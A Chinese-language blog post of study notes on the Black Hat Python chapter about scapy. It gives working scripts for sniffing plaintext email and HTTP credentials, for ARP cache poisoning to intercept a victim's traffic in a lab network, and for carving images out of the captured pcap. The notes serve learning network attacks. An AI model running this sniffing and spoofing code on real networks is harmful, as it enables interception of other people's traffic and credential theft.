---
title: 第 3 章 scapy：网络的掌控者
tags: 
- [python]
- [black_hat_python]
categories: 
- [python]
- [black_hat_python]
date: 2022-06-19
mathjax: true
comment: true
---

个人的知识笔记。

<!-- more -->

# 1. 窃取 Email 认证
首先，我们在前一章中做了许多工作，实现了网络的嗅探功能，但是很多工作都是从头开始，比如创建socket，从缓冲接收数据，对数据进行解析等工作，本章介绍的模块 `scapy` 将会非常简单的实现上嗅探的工作。

`scapy` 安装方式：`pip3 install scapy` 即可

![](https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220617154433.png)

然后介绍内置的一个函数 sniff：
```python
sniff(filter='', iface='any', prn=function, count=N)
```

- filter：允许我们对scapy嗅探的数据包指定一个BPF(Berkeley Packet Filter)过滤器。比如说，我们可以将BPF过滤器设置为 `tcp port 80` ，这样就只嗅探 HTTP 分组。当然，也可以将该参数留空以嗅探所有分组
- iface：设置嗅探的网卡，如果留空，则对所有网卡进行嗅探
- prn：指定一个回调函数，当嗅探到符合BPF过滤器的分组时，需要调用该回调函数，**这个回调函数以接收到的数据包对象作为唯一的参数**。
- count：指定需要嗅探的分组个数。留空则scapy嗅探无限个分组

编写一个简单的代码：
```python
from scapy.all import *  
  
def packet_callback(packet):  
    print(packet.show())
  
def main():  
    sniff(prn=packet_callback)  

if __name__ == '__main__':  
    main()
```

然后运行该代码（以root权限），等待收到的数据（可以打开一个网页，就会收到响应），然后该程序的作用会将分组信息显示出来(`packet.show()`)

![](https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220617155430.png)

解析来，将上述的代码进行修改，我们只需要嗅探跟Email有关的分组，并且获得里面的信息。

```python
from scapy.all import *  
from scapy.layers.inet import TCP, IP  
  
def packet_callback(packet):  
    if packet[TCP].payload:  
        mypacket = str(packet[TCP].payload)  
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():  
            print(f"[*] Destination: {packet[IP].dst}")  
            print(f"[*] {str(packet[TCP].payload)}")  
  
def main():  
    # 110 POP3, 143 IMAP, 25 SMTP  
    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143 or tcp port 80', prn=packet_callback, store=0)  
  
if __name__ == '__main__':  
    main()
```

这里的 filter 涉及到 BRF syntax（也叫做 Wireshark style），这里的意思是：只需要tcp协议，并且端口为110，25，143的分组，这三个端口是Email相关的协议使用的端口。然后打印出目标IP和用户名密码。

但是现在基本没有明文传输的，除非自己搭建服务，因此这里添加一个80端口看一下效果

![](https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220617221053.png)

因为HTTP协议中有一个 User-Agent 所以能够满足条件从而打印 payload

书中的结果如下图：

![](https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220617222600.png)

# 2. ARP 缓存投毒
原理其实就是两边骗：

1. 欺骗目标主机，使其相信我们的攻击主机就是它的网关
2. 欺骗网关，使其相信我们就是目标主机

>ARP缓存投毒只针对 IPv4

需要具备1个条件：

- 攻击主机和目标主机处于同一个网络，也就是网关相同
- 知道目标 IP 和网关 IP

过程：

1. 根据目标 IP 和网关 IP 分别获得目标主机的 MAC 地址和网关的 MAC 地址。`get_mac` 函数中实现
2. 不停的分别给目标主机发送 ARP 响应分组（op=2），给网关发送 ARP 响应分组（op=2）。`Arper.poison()` 方法中实现
3. 不停的监听网卡，当收到 IP 地址为目标主机的分组（可能是网关发的，也可能是目标主机发的），说明目标主机/网关的 ARP 缓存表已被更新，投毒成功，并将包的内容写入到 arper.pcap。 `Arper.sniff()` 方法中实现
4. 成功接收 100 个分组之后停止投毒。发送正确的 ARP 响应分组来恢复 ARP 缓存表。`Arper.restore()` 方法中实现

代码如下：

- 攻击主机 IP：10.0.2.4
- 目标主机 IP：10.0.2.21
- 网关 IP：10.0.2.1

```python
from multiprocessing import Process  
from scapy.all import *  
import os, sys, time  
  
class Arper:  
    def __init__(self, victim, gateway, interface='eth0'):  
        self.victim = victim  
        self.victimmac = get_mac(victim)  
        self.gateway = gateway  
        self.gatewaymac =get_mac(gateway)  
        self.interface = interface  
        conf.iface = interface  
        conf.verb = 0  
        print(f'Initialized {interface}: ')  
        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')  
        print(f'Victim ({victim}) is at {self.victimmac}')  
        print('-'*30)  
  
    def run(self):  
        self.poison_thread = Process(target=self.poison)  
        self.poison_thread.start()  
  
        self.sniff_thread = Process(target=self.sniff)  
        self.sniff_thread.start()  
  
    def poison(self):  
        # poison_victim: 欺骗 victim，假装为网关给 victim 发送  
        poison_victim = ARP()  
        poison_victim.op = 2  
        poison_victim.psrc = self.gateway  
        poison_victim.pdst = self.victim  
        poison_victim.hwdst = self.victimmac  
        print(f'ip src: {poison_victim.psrc}')  
        print(f'ip dst: {poison_victim.pdst}')  
        print(f'mac src: {poison_victim.hwsrc}')  
        print(f'mac dst: {poison_victim.hwdst}')  
        print(poison_victim.summary())  
        print('-'*30)  
        # poison_gateway: 欺骗 gateway，假装为 victim 给网关发送  
        poison_gateway = ARP()  
        poison_gateway.op = 2  
        poison_gateway.psrc = self.victim  
        poison_gateway.pdst = self.gateway  
        poison_gateway.hwdst = self.gatewaymac  
        print(f'ip src: {poison_gateway.psrc}')  
        print(f'ip dst: {poison_gateway.pdst}')  
        print(f'mac src: {poison_gateway.hwsrc}')  
        print(f'mac dst: {poison_gateway.hwdst}')  
        print(poison_gateway.summary())  
        print('-'*30)  
  
        print('Beginning the ARP poison. [CTRL-C to stop]')  
        while True:  
            sys.stdout.write('.')  # 往stdout缓冲区中写入 .
            sys.stdout.flush()  # stdout缓冲区不会一有内容就输出，该函数的作用就是显示的触发 stdout 输出缓冲区的内容
            try:  
                send(poison_victim)  
                send(poison_gateway)  
            except KeyboardInterrupt:  
                self.restore()  
                sys.exit()  
            else:  
                time.sleep(2)  
  
    def sniff(self, count=100):  
        time.sleep(5)  
        print(f'Sniffing {count} packet')  
        bpf_filter = 'ip host %s' % self.victim  
        packets = sniff(count=count, filter = bpf_filter, iface=self.interface)  
        wrpcap('arper.pcap', packets)  
        print('Got the packets')  
        self.restore()  
        self.poison_thread.terminate()  
        print('Finished.')  
  
    def restore(self):  
        print('Restoring ARP tables...')  
        send(ARP(  
            op = 2,  
            psrc = self.gateway,  
            pdst = self.victim,  
            hwsrc = self.gatewaymac,  
            hwdst = 'ff:ff:ff:ff:ff:ff'),  
            count = 5)  
  
        send(ARP(  
            op = 2,  
            psrc = self.victim,  
            pdst = self.gateway,  
            hwsrc = self.victimmac,  
            hwdst = 'ff:ff:ff:ff:ff:ff'),  
            count = 5)  
  
def get_mac(target_ip):  
    # Ether: 广播， ARP：请求MAC地址  
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=target_ip)  
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)  
    for _, r in resp:  
        return r[Ether].src  
    return None
  
if __name__ == '__main__':  
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])  
    myarp = Arper(victim, gateway, interface)  
    myarp.run()
```

在运行之前，我们首先要打开攻击主机的转发功能，当我们收到目标主机来的分组的时候要将其转发出去（给网关），从网关收到发给目标主机的分组也需要进行转发

```shell
echo 1 > /proc/sys/net/ipv4/ip_forward # 需要在 root 用户下执行
```

结果如下：

![](https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220618211703.png)

（等待了许久才用目标主机访问网站，这是因为 arp 缓存表是有时间限制的，投毒时间久一点能够保证目标主机和网关都被投毒。如果只有一方就很尴尬了）

看一下目标主机此时的 arp 缓存表：

![](https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220618211837.png)

可以看到 10.0.2.1（网关）和 10.0.2.4（攻击主机）的MAC地址一样，都是攻击主机的MAC地址，说明对目标主机投毒成功

![](https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220618212028.png)

看一下 arper.pcap 文件

![](https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220618212248.png)

可以看到，攻击主机成功当上了目标主机和网关之间的“代理”。

# 3. 处理 PCAP 文件
接下来处理刚刚获得的 pcap 文件，我们要求从中找到 HTTP 报文，并从中取出图片。代码如下：

```python
import os, re, sys, zlib, collections
from scapy.all import *

pwd = os.path.dirname(os.path.realpath(__file__))
OUTDIR = os.path.join(pwd, 'picture')
Response = collections.namedtuple('Response', ['header', 'payload'])

class Recapper:
    def __init__(self, fname):
        pcap = rdpcap(fname) # 读取 pcap 文件的内容
        self.sessions = pcap.sessions() # 剥离每个 TCP 会话
        self.responses = list()

    def get_responses(self):
        for session in self.sessions:
            payload = b''
            for packet in self.sessions[session]: # 读取每个会话的所有分组
                try:
                    if packet[TCP].dport == 80 or packet[TCP].sport == 80:
                        payload += bytes(packet[TCP].payload)
                except IndexError:
                    sys.stdout.write('-')
                    sys.stdout.flush()

            if payload:
                header = get_header(payload)
                if header is None:
                    continue
                self.responses.append(Response(header=header, payload=payload))
                
    def write(self, content_name):
        for i, response in enumerate(self.responses):
            content, content_type = extract_content(response, content_name)
            if content and content_type:
                fname = os.path.join(OUTDIR, f'ex_{i}.{content_type}')
                print(f'Writing {fname}')
                with open(fname, 'wb') as f:
                    f.write(content)

def get_header(payload):
    try:
        header_raw = payload[:payload.index(b'\r\n\r\n')+2]
    except ValueError:
        sys.stdout.write('-')
        sys.stdout.flush()
        return None
    header = dict(re.findall(r'(.*?): (.*?)\r\n', header_raw.decode()))
    if 'Content-Type' not in header:
        return None
    return header

def extract_content(response, content_name='image'):
    # Content-Type: image/jpeg\r\n 下面的注释以这个为栗子
    content, content_type = None, None
    if content_name in response.header['Content-Type']:
        content_type = response.header['Content-Type'].split('/')[1] # 获得图片的后缀 jpeg
        content = response.payload[response.payload.index(b'\r\n\r\n')+4: ]

        if 'Content-Encoding' in response.header:
            if response.header['Content-Encoding'] == 'gzip':
                content = zlib.decompress(response.payload, zlib.MAX_WBITS | 32)
            elif response.header['Content-Encoding'] == 'deflate':
                content = zlib.decompress(response.payload)

    return content, content_type

if __name__ == '__main__':
    pfile = os.path.join(pwd, 'arper.pcap')
    recapper = Recapper(pfile)
    recapper.get_responses()
    recapper.write('image')
```

- `get_header` 函数：取得 payload 的头部
- `extract_content` 函数：取出类型为 image 的分组的后缀名和数据，如果数据部分存在压缩，那么就进行解压缩
- `__init__` 方法：将每个 TCP 会话单独取出，并创建一个存放 self.response 的列表
- `get_responses` 方法：从每个 TCP 会话中过滤掉端口不是 80 的分组，然后将整个 TCP 会话中带有 TCP 头部的分组整合为一个 payload，并加入到 self.response 列表
- `write` 方法：将 self.response 中的 每一个 payload 的数据部分写到一个文件里

运行结果并不是很理想：

![](https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220619220721.png)

保存下来的图片大部分都是这样的

![](https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220619220806.png)

这有多个原因：

1. 一个 TCP 会话不止存在一个 HTTP 分组，这些分组有的不是图片的分组，有的是，而上述代码中不管三七二十一，将一个 TCP 会话中的所有 HTTP 分组合并
2. 在 `extract_content` 中只是读取了 `response.payload[response.payload.index(b'\r\n\r\n')+4: ]` 内容，如果只有一个 HTTP 分组的话，这确实是数据部分，但是 payload 中有多个分组，因此这就会将其他分组的头部也一并读取，而这些头部无法被识别为图片
   
   ![](https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220619221205.png)

3. 一张图片太大了，被拆成多个分组，不同分组的到来顺序不同，导致即使将数据部分正确拿到，也无法得到正确的图片。比如，我尝试将上图中的文件拆成多个文件，得到多张图片，其中一张图片如下：
   
   ![](https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220619223422.png)


书中还介绍了人脸识别，这属于机器学习的类别了，这里不做介绍。